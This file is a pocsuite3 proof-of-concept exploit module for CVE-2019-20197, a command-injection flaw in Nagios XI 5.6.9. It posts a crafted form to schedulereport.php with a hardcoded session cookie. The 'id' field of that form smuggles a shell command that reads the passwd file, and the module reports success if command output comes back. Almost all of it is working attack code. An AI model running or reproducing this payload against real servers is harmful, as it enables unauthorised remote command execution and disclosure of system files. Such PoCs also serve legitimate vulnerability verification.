#!/usr/bin/python
# -*- coding: utf-8 -*-
import re

from pocsuite3.api import requests as req  # 用法和 requests 完全相同
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase

headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0', 'content-type': 'application/x-www-form-urlencoded'}
cookies={'nagiosxi':'02v52nubcq54b9l2kmu7irhp67'}  #需要更新，默认账号root/nagiosxi
poc_str = '''nsp=06696ae90a4c1410f5b59cd1bf07d05ccfca286d8e15ce545fc637bd78349d4f&update=1&id=a%22%3Bcat%20etc%2fpasswd%0A%3B&type=page&url=includes%2Fcomponents%2Fxicore%2Fstatus.php%3Fshow%3Dhosts%26search%3D%25E8%25AE%25A1%25E5%2588%2592%25E6%258A%25A5%25E5%2591%258A%26noservices%3D1&wurl=%2Fnagiosxi%2Fincludes%2Fcomponents%2Fxicore%2Fstatus.php%3Fshow%3Dhosts%26search%3D%25E8%25AE%25A1%25E5%2588%2592%25E6%258A%25A5%25E5%2591%258A%26noservices%3D1&userid=0&length=0&sendonce=0&name=test&frequency=Daily&hour=09&minute=00&ampm=AM&dayofweek=1&dayofmonth=1&attachments%5Bpdf%5D=on&recipients=root%40localhost&subject=test&body=test&updateButton='''


def poc(url):
    response = ""
    url=str(url)[7:]
    url="http://"+url+"/nagiosxi//includes/components/scheduledreporting/schedulereport.php"
    try:
        res = req.post(url, data=poc_str, verify=False, timeout=5, headers=headers,cookies=cookies)
        response = res.text
    except Exception:
        response = ""
    return ("uid=" in response)


class TestPOC(POCBase):
    name = 'liunx_cve-2019-20197'
    vulID = 'CVE-2019-20197'
    author = ['weihong','mfz']
    vulType = 'RCE'
    version = '1.1'  # default version: 1.0
    references = ['']
    desc = '''
            Nagios XI 5.6.9版本，在Nagios的“报告”模块中，在schedulereport.php 处理参数时，可通过修改id的参数内容实现远程命令执行。
            攻击者需要获得Nagios XI 的web账号或cookie信息，验证登录后才可以利用此漏洞。 
		   '''
    vulDate = '2020-01-09'
    createDate = '2020-04-03'
    updateDate = '2020-04-03'
    appName = 'Liunx Nagios XI'
    appVersion = 'Liunx Nagios XI 5.6.9'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        aa = poc(self.url)
        if aa:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' Liunx_cve-2019-20197' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)
